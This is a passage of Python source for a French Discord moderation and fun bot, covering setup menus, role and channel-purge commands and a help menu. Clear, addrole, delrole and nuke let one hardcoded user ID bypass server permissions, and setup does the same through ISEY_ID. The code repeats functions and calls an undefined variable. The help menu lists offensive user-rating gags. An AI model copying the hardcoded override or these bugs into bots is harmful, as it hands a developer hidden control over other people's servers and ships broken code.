            embed.description = "⚠️ **Gérez les protections du serveur contre les abus et le spam.**\n🔽 **Sélectionnez une protection à activer/désactiver. Pour des protections supplémentaires, effectuez la commande +protection !**"
            embed.add_field(name="🔗 Anti-lien :", value=f"{'✅ Activé' if self.guild_data.get('anti_link', False) else '❌ Désactivé'}", inline=True)
            embed.add_field(name="💬 Anti-Spam :", value=f"{'✅ Activé' if self.guild_data.get('anti_spam', False) else '❌ Désactivé'}", inline=True)
            embed.add_field(name="🚫 Anti-Everyone :", value=f"{'✅ Activé' if self.guild_data.get('anti_everyone', False) else '❌ Désactivé'}", inline=True)

            self.clear_items()
            self.add_item(AntiSelect(self))
            self.add_item(ReturnButton(self))

        if self.embed_message:
            await self.embed_message.edit(embed=embed, view=self)

    async def notify_guild_owner(self, interaction, param, new_value):
        guild_owner = interaction.guild.owner  
        if guild_owner:  
            embed = discord.Embed(
                title="🔔 **Mise à jour de la configuration**",
                description=f"⚙️ **Une modification a été effectuée sur votre serveur `{interaction.guild.name}`.**",
                color=discord.Color.orange(),
                timestamp=discord.utils.utcnow()
            )
            embed.add_field(name="👤 **Modifié par**", value=interaction.user.mention, inline=True)
            embed.add_field(name="🔧 **Paramètre modifié**", value=f"`{param}`", inline=True)
            embed.add_field(name="🆕 **Nouvelle valeur**", value=f"{new_value}", inline=False)
            embed.set_thumbnail(url=interaction.guild.icon.url if interaction.guild.icon else None)
            embed.set_footer(text="Pensez à vérifier la configuration si nécessaire.")

            await guild_owner.send(embed=embed)

def format_mention(id, type_mention):
    if not id or id == "Non défini":
        return "❌ **Non défini**"

    if isinstance(id, int) or (isinstance(id, str) and id.isdigit()):
        if type_mention == "user":
            return f"<@{id}>"
        elif type_mention == "role":
            return f"<@&{id}>"
        elif type_mention == "channel":
            return f"<#{id}>"
        return "❌ **Mention invalide**"

    if isinstance(id, discord.Message):
        try:
            author_mention = id.author.mention if hasattr(id, 'author') else "Auteur inconnu"
            channel_mention = id.channel.mention if hasattr(id, 'channel') else "Salon inconnu"
            return f"**{author_mention}** dans **{channel_mention}**"
        except Exception as e:
            print(f"Erreur formatage Message : {e}")
            return "❌ **Erreur formatage message**"

    print(f"⚠️ format_mention: type inattendu pour id = {id} ({type(id)})")
    return "❌ **Format invalide**"

class MainSelect(Select):
    def __init__(self, view):
        options = [
            discord.SelectOption(label="⚙️ Gestion du Bot", description="Modifier les rôles et salons", value="gestion"),
            discord.SelectOption(label="🛡️ Sécurité & Anti-Raid", description="Configurer les protections", value="anti")
        ]
        super().__init__(placeholder="📌 Sélectionnez une catégorie", options=options)
        self.view_ctx = view

    async def callback(self, interaction: discord.Interaction):
        await interaction.response.defer()  
        if hasattr(self.view_ctx, 'update_embed'):
            await self.view_ctx.update_embed(self.values[0])  
        else:
            print("Erreur: view_ctx n'a pas la méthode update_embed.")

class ReturnButton(Button):
    def __init__(self, view):
        super().__init__(style=discord.ButtonStyle.danger, label="🔙 Retour", custom_id="return")
        self.view_ctx = view

    async def callback(self, interaction: discord.Interaction):
        await interaction.response.defer()
        await self.view_ctx.update_embed("accueil")

class InfoSelect(Select):
    def __init__(self, view):
        options = [
            discord.SelectOption(label="⚙️ Modifier le préfixe", value="prefix"),
            discord.SelectOption(label="👑 Propriétaire", value="owner"),
            discord.SelectOption(label="🛡️ Rôle Admin", value="admin_role"),
            discord.SelectOption(label="👥 Rôle Staff", value="staff_role"),
            discord.SelectOption(label="🚨 Salon Sanctions", value="sanctions_channel"),
        ]
        super().__init__(placeholder="🎛️ Sélectionnez un paramètre à modifier", options=options)
        self.view_ctx = view

    async def callback(self, interaction: discord.Interaction):
        param = self.values[0]

        if param == "prefix":
            embed_request = discord.Embed(
                title="✏️ **Modification du Préfixe du Bot**",
                description="Veuillez entrer le **nouveau préfixe** pour le bot.",
                color=discord.Color.blurple(),
                timestamp=discord.utils.utcnow()
            )
            embed_request.set_footer(text="Répondez dans les 60 secondes.")
            await interaction.response.send_message(embed=embed_request, ephemeral=True)

            def check(msg):
                return msg.author == self.view_ctx.ctx.author and msg.channel == self.view_ctx.ctx.channel

            try:
                response = await self.view_ctx.ctx.bot.wait_for("message", check=check, timeout=60)
                await response.delete()  
            except asyncio.TimeoutError:
                embed_timeout = discord.Embed(
                    title="⏳ **Temps écoulé**",
                    description="Aucune modification effectuée.",
                    color=discord.Color.red()
                )
                return await interaction.followup.send(embed=embed_timeout, ephemeral=True)

            new_value = response.content.strip()

            if new_value:
                self.view_ctx.collection.update_one(
                    {"guild_id": str(self.view_ctx.ctx.guild.id)},
                    {"$set": {"prefix": new_value}},
                    upsert=True
                )
                self.view_ctx.guild_data["prefix"] = new_value
                await self.view_ctx.notify_guild_owner(interaction, "prefix", new_value)

                embed_success = discord.Embed(
                    title="✅ **Modification enregistrée !**",
                    description=f"Le préfixe a été mis à jour avec succès.",
                    color=discord.Color.green(),
                    timestamp=discord.utils.utcnow()
                )
                await interaction.followup.send(embed=embed_success, ephemeral=True)

@bot.hybrid_command(name="setup", description="Configure le bot pour ce serveur.")
async def setup(ctx):
    print("Commande 'setup' appelée.")  # Log de débogage
    if ctx.author.id != ISEY_ID and not ctx.author.guild_permissions.administrator:
        print("Utilisateur non autorisé.")
        await ctx.send("❌ Vous n'avez pas les permissions nécessaires.", ephemeral=True)
        return

    guild_data = collection.find_one({"guild_id": str(ctx.guild.id)}) or {}

    embed = discord.Embed(
        title="⚙️ **Configuration du Serveur**",
        description="""
        🔧 **Bienvenue dans le setup !**  
        Configurez votre serveur facilement en quelques clics !  

        📌 **Gestion du Bot** - 🎛️ Modifier les rôles et salons.  

        🔽 **Sélectionnez une option pour commencer !**
        """,
        color=discord.Color.blurple()
    )

    print("Embed créé, envoi en cours...")
    view = SetupView(ctx, guild_data, collection)
    await view.start()  # ✅ appelle la méthode start(), qui envoie le message et stocke embed_message
    print("Message d'embed envoyé.")

#-------------------------------------------------------------------------- Commandes Liens Etherya: /etherya

@bot.tree.command(name="etherya", description="Obtiens le lien du serveur Etherya !")
async def etherya(interaction: discord.Interaction):
    """Commande slash pour envoyer l'invitation du serveur Etherya"""
    message = (
        "🌟 **[𝑺ץ] 𝑬𝒕𝒉𝒆𝒓𝒚𝒂 !** 🌟\n\n"
        "🍣 ・ Un serveur **Communautaire**\n"
        "🌸 ・ Des membres sympas et qui **sont actifs** !\n"
        "🌋 ・ Des rôles **exclusifs** avec une **boutique** !\n"
        "🎐 ・ **Safe place** & **Un Système Économique développé** !\n"
        "☕ ・ Divers **Salons** pour un divertissement optimal.\n"
        "☁️ ・ Un staff sympa, à l'écoute et qui **recrute** !\n"
        "🔥 ・ Pas convaincu ? Rejoins-nous et vois par toi-même le potentiel de notre serveur !\n\n"
        "🎫 **[Accès direct au serveur Etherya !](https://discord.gg/weX6tKbDta) **\n\n"
        "Rejoins-nous et amuse-toi ! 🎉"
    )

    await interaction.response.send_message(message)
#------------------------------------------------------------------------- Commandes de Gestion : +clear, +nuke, +addrole, +delrole

@bot.command()
async def clear(ctx, amount: int = None):
    # Vérifie si l'utilisateur a la permission de gérer les messages ou s'il est l'ID autorisé
    if ctx.author.id == 792755123587645461 or ctx.author.guild_permissions.manage_messages:
        if amount is None:
            await ctx.send("Merci de préciser un chiffre entre 2 et 100.")
            return
        if amount < 2 or amount > 100:
            await ctx.send("Veuillez spécifier un nombre entre 2 et 100.")
            return

        deleted = await ctx.channel.purge(limit=amount)
        await ctx.send(f'{len(deleted)} messages supprimés.', delete_after=5)
    else:
        await ctx.send("Vous n'avez pas la permission d'utiliser cette commande.")

# Configuration des emojis personnalisables
EMOJIS = {
    "members": "👥",
    "crown": "👑",  # Emoji couronne
    "voice": "🎤",
    "boosts": "🚀"
}

@bot.command()
async def addrole(ctx, user: discord.Member = None, role: discord.Role = None):
    """Ajoute un rôle à un utilisateur."""
    # Vérifie si l'utilisateur a la permission de gérer les rôles
    if ctx.author.id != 792755123587645461 and not ctx.author.guild_permissions.manage_roles:
        await ctx.send("Tu n'as pas les permissions nécessaires pour utiliser cette commande.")
        return

    # Vérifier si les arguments sont bien fournis
    if user is None or role is None:
        await ctx.send("Erreur : veuillez suivre ce format : +addrole @user @rôle")
        return

    try:
        # Ajouter le rôle à l'utilisateur
        await user.add_roles(role)
        await ctx.send(f"{user.mention} a maintenant le rôle {role.name} !")
    except discord.Forbidden:
        await ctx.send("Je n'ai pas les permissions nécessaires pour attribuer ce rôle.")
    except discord.HTTPException as e:
        await ctx.send(f"Une erreur est survenue : {e}")
    
@bot.command()
async def delrole(ctx, user: discord.Member = None, role: discord.Role = None):
    """Retire un rôle à un utilisateur."""
    # Vérifie si l'utilisateur a la permission de gérer les rôles
    if ctx.author.id != 792755123587645461 and not ctx.author.guild_permissions.manage_roles:
        await ctx.send("Tu n'as pas les permissions nécessaires pour utiliser cette commande.")
        return

    # Vérifier si les arguments sont bien fournis
    if user is None or role is None:
        await ctx.send("Erreur : veuillez suivre ce format : +delrole @user @rôle")
        return

    try:
        # Retirer le rôle à l'utilisateur
        await user.remove_roles(role)
        await ctx.send(f"{user.mention} n'a plus le rôle {role.name} !")
    except discord.Forbidden:
        await ctx.send("Je n'ai pas les permissions nécessaires pour retirer ce rôle.")
    except discord.HTTPException as e:
        await ctx.send(f"Une erreur est survenue : {e}")

# Vérifie si l'utilisateur a la permission de gérer les rôles ou l'ID correct
def has_permission(ctx):
    return any(role.id == ISEY_ID for role in ctx.author.roles) or ctx.author.guild_permissions.manage_roles

# Vérifie si l'utilisateur a la permission de gérer les rôles ou l'ID correct
def has_permission(ctx):
    # Vérifie si l'utilisateur a l'ID de permission ou la permission "Gérer les rôles"
    return any(role.id == ISEY_ID for role in ctx.author.roles) or ctx.author.guild_permissions.manage_roles

# Vérifie si l'utilisateur a la permission de gérer les rôles ou l'ID correct
def has_permission(ctx):
    # Vérifie si l'utilisateur a l'ID de permission ou la permission "Gérer les rôles"
    return any(role.id == ISEY_ID for role in ctx.author.roles) or ctx.author.guild_permissions.manage_roles

# Vérifie si l'utilisateur a la permission de gérer les rôles ou l'ID correct
def has_permission(ctx):
    # Vérifie si l'utilisateur a l'ID de permission ou la permission "Gérer les rôles"
    return any(role.id == ISEY_ID for role in ctx.author.roles) or ctx.author.guild_permissions.manage_roles

def has_permission(ctx, perm=None):
    # Exemple d'une fonction de vérification de permissions
    if perm is None:
        perm = "admin"  # Par défaut, on suppose que l'admin a la permission
    # Logique pour vérifier la permission, par exemple :
    return ctx.author.permissions_in(ctx.channel).administrator  # Remplace cette logique par celle qui te convient.

@bot.command()
async def massrole(ctx, action: str = None, role: discord.Role = None):
    # Vérifie si les arguments sont présents
    if action is None or role is None:
        return await ctx.send("Erreur : tu dois spécifier l'action ('add' ou 'remove') et le rôle. Exemple : `+massrole add @role` ou `+massrole remove @role`.")

    # Vérifie si l'utilisateur a la permission nécessaire
    if not has_permission(ctx, "admin"):  # Spécifie ici la permission requise
        return await ctx.send("Tu n'as pas les permissions nécessaires pour utiliser cette commande.")

    # Vérifie que l'action soit correcte (add ou remove)
    if action not in ['add', 'remove']:
        return await ctx.send("Erreur : l'action doit être 'add' ou 'remove'.")

    # Action pour ajouter ou retirer le rôle
    for member in ctx.guild.members:
        # S'assurer que ce n'est pas un bot
        if not member.bot:
            try:
                if action == 'add':
                    # Ajoute le rôle à l'utilisateur
                    await member.add_roles(role)
                elif action == 'remove':
                    # Retire le rôle à l'utilisateur
                    await member.remove_roles(role)
                print(f"Le rôle a été {action}é pour {member.name}")
            except discord.DiscordException as e:
                print(f"Erreur avec {member.name}: {e}")

    await ctx.send(f"Le rôle '{role.name}' a été {action} à tous les membres humains du serveur.")

@bot.command()
async def nuke(ctx):
    # Vérifie si l'utilisateur a la permission Administrateur
    if ctx.author.id != 792755123587645461 and not ctx.author.guild_permissions.administrator:
        await ctx.send("Tu n'as pas les permissions nécessaires pour exécuter cette commande.")
        return

    # Vérifie que la commande a été lancée dans un salon texte
    if isinstance(ctx.channel, discord.TextChannel):
        # Récupère le salon actuel
        channel = ctx.channel

        # Sauvegarde les informations du salon
        overwrites = channel.overwrites
        channel_name = channel.name
        category = channel.category
        position = channel.position

        # Récupère l'ID du salon pour le recréer
        guild = channel.guild

        try:
            # Supprime le salon actuel
            await channel.delete()

            # Crée un nouveau salon avec les mêmes permissions, catégorie et position
            new_channel = await guild.create_text_channel(
                name=channel_name,
                overwrites=overwrites,
                category=category
            )

            # Réajuste la position du salon
            await new_channel.edit(position=position)

            # Envoie un message dans le nouveau salon pour confirmer la recréation
            await new_channel.send(
                f"💥 {ctx.author.mention} a **nuké** ce salon. Il a été recréé avec succès."
            )
        except Exception as e:
            await ctx.send(f"Une erreur est survenue lors de la recréation du salon : {e}")
    else:
        await ctx.send("Cette commande doit être utilisée dans un salon texte.")
    # IMPORTANT : Permet au bot de continuer à traiter les commandes
    await bot.process_commands(message)
    
#------------------------------------------------------------------------- Commandes d'aide : +aide, /help
@bot.command()
async def help(ctx):
    banner_url = "https://github.com/Iseyg91/KNSKS-ET/blob/main/IMAGES%20Delta/uri_ifs___M_5e2bd04a-3995-4937-979e-1aeb20cd5fc1.jpg?raw=true"  # URL de la bannière
    embed = discord.Embed(
        title="🏡 **Accueil Project : Delta **",
        description=f"Hey, bienvenue {ctx.author.mention} sur la page d'accueil de Project : Delta! 🎉\n\n"
                    "Ici, vous trouverez toutes les informations nécessaires pour gérer et administrer votre serveur efficacement. 🌟",
        color=discord.Color(0x1abc9c)
    )
    embed.set_thumbnail(url=bot.user.avatar.url)
    embed.set_footer(text="Développé avec ❤️ par Iseyg. Merci pour votre soutien !")
    embed.set_image(url=banner_url)  # Ajout de la bannière en bas de l'embed

    # Informations générales
    embed.add_field(name="📚 **Informations**", value=f"• **Mon préfixe** : +\n• **Nombre de commandes** : 70", inline=False)

    # Création du menu déroulant
    select = discord.ui.Select(
        placeholder="Choisissez une catégorie 👇", 
        options=[
            discord.SelectOption(label="Owner Bot", description="👑Commandes pour gèrer le bot", emoji="🎓"),
            discord.SelectOption(label="Configuration du Bot", description="🖇️Commandes pour configurer le bot", emoji="📡"),
            discord.SelectOption(label="Gestion", description="📚 Commandes pour gérer le serveur", emoji="🔧"),
            discord.SelectOption(label="Utilitaire", description="⚙️ Commandes utiles", emoji="🔔"),
            discord.SelectOption(label="Modération", description="⚖️ Commandes Modération", emoji="🔨"),
            discord.SelectOption(label="Bot", description="🤖 Commandes Bot", emoji="🦾"),
            discord.SelectOption(label="Économie", description="💸 Commandes économie", emoji="💰"),
            discord.SelectOption(label="Ludiques", description="🎉 Commandes amusantes pour détendre l'atmosphère et interagir avec les autres.", emoji="🎈"),
            discord.SelectOption(label="Test & Défis", description="🧠Commandes pour testez la personnalité et défiez vos amis avec des jeux et des évaluations.", emoji="🎲"),
            discord.SelectOption(label="Crédits", description="💖 Remerciements et crédits", emoji="🙏")
        ], 
        custom_id="help_select"
    )

    # Définir la méthode pour gérer l'interaction du menu déroulant
    async def on_select(interaction: discord.Interaction):
        category = interaction.data['values'][0]
        new_embed = discord.Embed(color=discord.Color(0x1abc9c))
        new_embed.set_image(url=banner_url)  # Ajout de la bannière dans chaque catégorie
        if category == "Owner Bot":
            new_embed.title = "👑 **Commandes de Gestion du Bot**"
            new_embed.description = "Bienvenue dans la section gestion du bot !"
            new_embed.add_field(name="💥 +shutdown", value="Déconnecte le **bot** ✂️.\n*Pour une action plus drastique en cas de chaos ou d'urgence !*.", inline=False)
            new_embed.add_field(name="🔧 +restart", value="Redémarre le **bot** 📍.\n*À utiliser en cas de mise à jour ou de bug mineur.*", inline=False)
            new_embed.add_field(name="🎈 +serverinfoall", value="Affiche les **informations de tous les serveurs** où le bot est présent.",  inline=False)
            new_embed.set_footer(text="♥️ by Iseyg")
        if category == "Configuration du Bot":
            new_embed.title = "🗃️ **Commandes de Configuration du Bot**"
            new_embed.description = "Bienvenue dans la section configuration du bot !"
            new_embed.add_field(name="⚙️ +setup", value="Lance la **configuration du bot** sur le serveur ⚙️.\n*Permet de personnaliser les paramètres du bot selon les besoins du serveur.*", inline=False)
            new_embed.add_field(name="🛡️ +protection", value="Affiche les **protections disponibles** sur le bot et permet de les **activer ou désactiver** 🛠️.\n*Utile pour gérer les options de sécurité comme l'anti-spam, l'anti-lien, etc.*", inline=False)
            new_embed.add_field(name="🔓 +addwl", value="Ajoute un membre à la **whitelist** pour qu'il soit **ignoré** par les protections du bot 🛡️.\n*Permet d'exempter certains utilisateurs des actions de sécurité comme l'anti-spam ou l'anti-lien.*", inline=False)
            new_embed.add_field(name="❌ +removewl", value="Supprime un membre de la **whitelist** pour qu'il soit de nouveau **sujet aux protections** du bot 🛡️.\n*Utilisé pour réactiver les actions de sécurité contre l'utilisateur.*", inline=False)
            new_embed.add_field(name="🔍 +listwl", value="Affiche la **liste des membres sur la whitelist** du bot 🛡️.\n*Permet de voir quels utilisateurs sont exemptés des protections du bot.*", inline=False)
            new_embed.set_footer(text="♥️ by Iseyg")
        if category == "Gestion":
            new_embed.title = "🔨 **Commandes de Gestion**"
            new_embed.description = "Bienvenue dans la section gestion ! 📊\nCes commandes sont essentielles pour administrer le serveur. Voici un aperçu :"
            new_embed.add_field(name="🔧 +clear (2-100)", value="Supprime des messages dans le salon 📬.\n*Utilisé pour nettoyer un salon ou supprimer un spam.*", inline=False)
            new_embed.add_field(name="💥 +nuke", value="Efface **tous** les messages du salon 🚨.\n*Pour une action plus drastique en cas de chaos ou d'urgence !*.", inline=False)
            new_embed.add_field(name="➕ +addrole @user @rôle", value="Ajoute un rôle à un utilisateur 👤.\n*Pour attribuer des rôles et des privilèges spéciaux aux membres.*", inline=False)
            new_embed.add_field(name="➖ +delrole @user @rôle", value="Retire un rôle à un utilisateur 🚫.\n*Retirer un rôle en cas de sanction ou de changement de statut.*", inline=False)
            new_embed.add_field(name="🔲 /embed", value="Crée un **embed personnalisé** avec du texte, des images et des couleurs 🎨.\n*Pratique pour partager des informations de manière stylée et structurée.*", inline=False)
            new_embed.add_field(name="🚫 +listban", value="Affiche la **liste des membres bannis** du serveur ⚠️.\n*Permet aux admins de voir les bannissements en cours.*", inline=False)
            new_embed.add_field(name="🔓 +unbanall", value="Dé-banni **tous les membres** actuellement bannis du serveur 🔓.\n*Utilisé pour lever les bannissements en masse.*", inline=False)
            new_embed.add_field(name="🎉 +gcreate", value="Crée un **giveaway** (concours) pour offrir des récompenses aux membres 🎁.\n*Permet d'organiser des tirages au sort pour des prix ou des objets.*", inline=False)
            new_embed.add_field(name="⚡ +fastgw", value="Crée un **giveaway rapide** avec une durée courte ⏱️.\n*Idéal pour des concours instantanés avec des récompenses immédiates.*", inline=False)
            new_embed.add_field(name="💎 /premium", value="Entre un **code premium** pour devenir membre **premium** et accéder à des fonctionnalités exclusives ✨.\n*Permet de débloquer des avantages supplémentaires pour améliorer ton expérience.*", inline=False)
            new_embed.add_field(name="🔍 /viewpremium", value="Affiche la **liste des serveurs premium** actuellement actifs 🔑.\n*Permet de voir quels serveurs ont accédé aux avantages premium.*", inline=False)
            new_embed.add_field(name="💎 /devenirpremium", value="Obtiens des **informations** sur la manière de devenir membre **premium** et débloquer des fonctionnalités exclusives ✨.\n*Un guide pour savoir comment accéder à l'expérience premium et ses avantages.*", inline=False)
            new_embed.set_footer(text="♥️ by Iseyg")
        elif category == "Utilitaire":
            new_embed.title = "⚙️ **Commandes Utilitaires**"
            new_embed.description = "Bienvenue dans la section modération ! 🚨\nCes commandes sont conçues pour gérer et contrôler l'activité du serveur, en assurant une expérience sûre et agréable pour tous les membres."
            new_embed.add_field(name="📊 +vc", value="Affiche les statistiques du serveur en temps réel .\n*Suivez l'évolution du serveur en direct !*.", inline=False)
            new_embed.add_field(name="🚨 +alerte @user <reason>", value="Envoie une alerte au staff en cas de comportement inapproprié (insultes, spam, etc.) .\n*Note : Si cette commande est utilisée abusivement, des sanctions sévères seront appliquées !*.", inline=False)
            new_embed.add_field(name="📶 +ping", value="Affiche la latence du bot en millisecondes.", inline=False)
            new_embed.add_field(name="⏳ +uptime", value="Affiche depuis combien de temps le bot est en ligne.", inline=False)
            new_embed.add_field(name="ℹ️ /rôle info <nom_du_rôle>", value="Affiche les informations détaillées sur un rôle spécifique.", inline=False)
            new_embed.add_field(name="ℹ💡 /idée", value="Note une idée ou une chose à faire dans ta liste perso 📝.\n*Parfait pour te rappeler d'un projet, d'une envie ou d'un objectif.*", inline=False)
            new_embed.add_field(name="📋 +listi", value="Affiche la **liste de tes idées notées** 🧾.\n*Utile pour retrouver facilement ce que tu as prévu ou pensé.*", inline=False)
            new_embed.add_field(name="💬 /suggestion", value="Propose une **suggestion ou une idée** pour améliorer **Etherya** ou le **bot** 🛠️.\n*Ton avis compte, alors n’hésite pas à participer à l’évolution du projet.*", inline=False)
            new_embed.add_field(name="📊 /sondage", value="Crée un **sondage** pour obtenir l'avis des membres du serveur 📋.\n*Parfait pour recueillir des retours ou prendre des décisions collectives.*", inline=False)
            new_embed.add_field(name="⏰ /rappel", value="Crée un **rappel personnel** pour ne rien oublier 📅.\n*Tu peux programmer des rappels pour des événements, des tâches ou des objectifs.*", inline=False)
            new_embed.add_field(name="👋 /presentation", value="Présente-toi au serveur et fais connaissance avec les membres 🌟.\n*Une manière sympa de partager tes intérêts et d'en savoir plus sur la communauté.*", inline=False)
            new_embed.add_field(name="🤖 +getbotinfo", value="Affiche des **informations détaillées** sur le bot 🛠️.\n*Comprend des données comme la version, les statistiques et les fonctionnalités du bot.*", inline=False)
            new_embed.add_field(name="👑 +alladmin", value="Affiche la **liste de tous les administrateurs** du serveur 🔑.\n*Utile pour voir les membres avec les privilèges d'administration.*", inline=False)
            new_embed.add_field(name="🔍 +snipe", value="Affiche le **dernier message supprimé** du serveur 🕵️.\n*Permet de récupérer le contenu des messages effacés récemment.*", inline=False)
            new_embed.set_footer(text="♥️ by Iseyg")
        elif category == "Modération":
            new_embed.title = "🔑 **Commandes Modération**"
            new_embed.add_field(name="🚫 +ban @user", value="Exile un membre du serveur pour un comportement inacceptable .\nL'action de bannir un utilisateur est irréversible et est utilisée pour des infractions graves aux règles du serveur.*", inline=False)
            new_embed.add_field(name="🚔 +unban @user", value="Lève le bannissement d'un utilisateur, lui permettant de revenir sur le serveur .\nUnban un utilisateur qui a été banni, après examen du cas et décision du staff..*", inline=False)
            new_embed.add_field(name="⚖️ +mute @user", value="Rend un utilisateur silencieux en l'empêchant de parler pendant un certain temps .\nUtilisé pour punir les membres qui perturbent le serveur par des messages intempestifs ou offensants.", inline=False)
            new_embed.add_field(name="🔓 +unmute @user", value="Annule le silence imposé à un utilisateur et lui redonne la possibilité de communiquer 🔊.\nPermet à un membre de reprendre la parole après une période de mute.", inline=False)
            new_embed.add_field(name="⚠️ +warn @user", value="Avertit un utilisateur pour un comportement problématique ⚠.\nUn moyen de signaler qu'un membre a enfreint une règle mineure, avant de prendre des mesures plus sévères.", inline=False)
            new_embed.add_field(name="🚪 +kick @user", value="Expulse un utilisateur du serveur pour une infraction moins grave .\nUn kick expulse temporairement un membre sans le bannir, pour des violations légères des règles.", inline=False)
            new_embed.set_footer(text="♥️ by Iseyg")
        elif category == "Bot":
            new_embed.title = "🔑 **Commandes Bot**"
            new_embed.add_field(name="🔊 /connect", value="Connecte le **bot à un canal vocal** du serveur 🎤.\n*Permet au bot de rejoindre un salon vocal pour y diffuser de la musique ou d'autres interactions.*", inline=False)
            new_embed.add_field(name="🔴 /disconnect", value="Déconnecte le **bot du canal vocal** 🎤.\n*Permet au bot de quitter un salon vocal après une session musicale ou autre interaction.*", inline=False)
            new_embed.add_field(name="🌐 /etherya", value="Affiche le **lien du serveur Etherya** pour rejoindre la communauté 🚀.\n*Permet d'accéder facilement au serveur Etherya et de rejoindre les discussions et événements.*", inline=False)
            new_embed.set_footer(text="♥️ by Iseyg")
        elif category == "Économie":
            new_embed.title = "⚖️ **Commandes Économie**"
            new_embed.description = "Gérez l’économie et la sécurité du serveur ici ! 💼"
            new_embed.add_field(name="🏰 +prison @user", value="Mets un utilisateur en prison pour taxes impayées.", inline=False)
            new_embed.add_field(name="🚔 +arrestation @user", value="Arrête un utilisateur après un braquage raté.", inline=False)
            new_embed.add_field(name="⚖️ +liberation @user", value="Libère un utilisateur après le paiement des taxes.", inline=False)
            new_embed.add_field(name="🔓 +evasion", value="Permet de s’évader après un braquage raté.", inline=False)
            new_embed.add_field(name="💰 +cautionpayer @user", value="Payez la caution d’un membre emprisonné.", inline=False)
            new_embed.add_field(name="🎫 +ticket_euro_million @user", value="Achetez un ticket Euromillion avec un combiné.", inline=False)
            new_embed.set_footer(text="♥️ by Iseyg")
        elif category == "Ludiques":
            new_embed.title = "🎉 **Commandes de Détente**"
            new_embed.description = "Bienvenue dans la section Détente ! 🎈\nCes commandes sont conçues pour vous amuser et interagir de manière légère et drôle. Profitez-en !"
            new_embed.add_field(name="🤗 +hug @user", value="Envoie un câlin à [membre] avec une image mignonne de câlin.", inline=False)
            new_embed.add_field(name="💥 +slap @user", value="Tu as giflé [membre] avec une image drôle de gifle.", inline=False)
            new_embed.add_field(name="💃 +dance @user", value="[membre] danse avec une animation rigolote.", inline=False)
            new_embed.add_field(name="💘 +flirt @user", value="Vous avez charmé [membre] avec un compliment !", inline=False)
            new_embed.add_field(name="💋 +kiss @user", value="Vous avez embrassé [membre] afin de lui démontrer votre amour !", inline=False)
            new_embed.add_field(name="🤫 +whisper @user [message]", value="[membre] a chuchoté à [ton nom] : [message].", inline=False)
            new_embed.add_field(name="🌟 +blague", value="Envoie une blague aléatoire, comme 'Pourquoi les plongeurs plongent toujours en arrière et jamais en avant ? Parce que sinon ils tombent toujours dans le bateau !'.", inline=False)
            new_embed.add_field(name="🪙 +coinflip", value="Lancez une pièce pour voir si vous gagnez ! \n*Tentez votre chance et découvrez si vous avez un coup de chance.*", inline=False)
            new_embed.add_field(name="🎲 +dice", value="Lancez un dé à 6 faces et voyez votre chance ! \n*Choisissez un numéro entre 1 et 6 et voyez si vous avez tiré le bon!*", inline=False)
            new_embed.add_field(name="🗣️ +say", value="Faites dire quelque chose au bot à la place de vous ! 🗨\n*Lancez votre message et il sera annoncé à tout le serveur !*", inline=False)
            new_embed.set_footer(text="♥️ by Iseyg")
        elif category == "Test & Défis":
            new_embed.title = "🎯 **Commandes de Tests et Défis**"
            new_embed.description = "Bienvenue dans la section Tests et Défis ! 🎲\nIci, vous pouvez évaluer les autres, tester votre compatibilité et relever des défis fun !"
            new_embed.add_field(name="🌈 +gay @user", value="Détermine le taux de gayitude d'un utilisateur .\n*Testez votre ouverture d'esprit !*.", inline=False)
            new_embed.add_field(name="😤 +racist @user", value="Détermine le taux de racisme d'un utilisateur .\n*Un test amusant à faire avec vos amis.*", inline=False)
            new_embed.add_field(name="💘 +love @user", value="Affiche le niveau de compatibilité amoureuse .\n*Testez votre compatibilité avec quelqu'un !*.", inline=False)
            new_embed.add_field(name="🐀 +rat @user", value="Détermine le taux de ratitude d'un utilisateur .\n*Vérifiez qui est le plus ‘rat’ parmi vos amis.*", inline=False)
            new_embed.add_field(name="🍆 +zizi @user", value="Évalue le niveau de zizi de l'utilisateur .\n*Un test ludique pour voir qui a le plus grand ego !*.", inline=False)
            new_embed.add_field(name="🤡 +con @user", value="Détermine le taux de connerie d'un utilisateur .\n*Un test amusant à faire avec vos amis.*", inline=False)
            new_embed.add_field(name="🤪 +fou @user", value="Détermine le taux de folie d'un utilisateur .\n*Testez l'état mental de vos amis !*.", inline=False)
            new_embed.add_field(name="💪 +testo @user", value="Détermine le taux de testostérone d'un utilisateur .\n*Testez la virilité de vos amis !*.", inline=False)
            new_embed.add_field(name="🍑 +libido @user", value="Détermine le taux de libido d'un utilisateur .\n*Testez la chaleur de vos amis sous la couette !*.", inline=False)
            new_embed.add_field(name="🪴 +pfc @user", value="Jouez à Pierre-Feuille-Ciseaux avec un utilisateur ! \n*Choisissez votre coup et voyez si vous gagnez contre votre adversaire !*.", inline=False)
            new_embed.add_field(name="🔫 +gunfight @user", value="Affrontez un autre utilisateur dans un duel de Gunfight ! \n*Acceptez ou refusez le défi et découvrez qui sera le gagnant !*", inline=False)
            new_embed.add_field(name="💀 +kill @user", value="Tuez un autre utilisateur dans un duel de force ! \n*Acceptez ou refusez le défi et découvrez qui sortira vainqueur de cette confrontation!*", inline=False)
            new_embed.add_field(name="🔄 +reverse [texte]", value="Inverser un texte et le partager avec un autre utilisateur ! \n*Lancez un défi pour voir si votre inversion sera correcte !*", inline=False)
            new_embed.add_field(name="⭐ +note @user [note sur 10]", value="Notez un autre utilisateur sur 10 ! \n*Exprimez votre avis sur leur comportement ou performance dans le serveur.*", inline=False)
            new_embed.add_field(name="🎲 +roll", value="Lance un dé pour générer un nombre aléatoire entre 1 et 500 .\n*Essayez votre chance !*.", inline=False)
            new_embed.add_field(name="🥊 +fight @user", value="Lancez un duel avec un autre utilisateur ! \n*Acceptez ou refusez le combat et découvrez qui sera le champion du serveur.*", inline=False)
            new_embed.add_field(name="⚡ +superpouvoir @user", value="Déclenche un super-pouvoir épique pour un utilisateur !\n*Donne un pouvoir aléatoire allant du cool au complètement débile, comme la téléportation, la super vitesse, ou même la création de burgers.*", inline=False)
            new_embed.add_field(name="🌿 +totem @user", value="Découvrez votre animal totem spirituel !\n*Un animal magique et spirituel vous guidera, qu’il soit un loup protecteur ou un poisson rouge distrait. Un résultat épique et amusant !*", inline=False)
            new_embed.add_field(name="🔮 +futur @user", value="Prédit l'avenir d'un utilisateur de manière totalement farfelue !\n*L'avenir peut être aussi improbable qu'un trésor caché rempli de bonbons ou une rencontre avec un extraterrestre amateur de chats.*", inline=False)
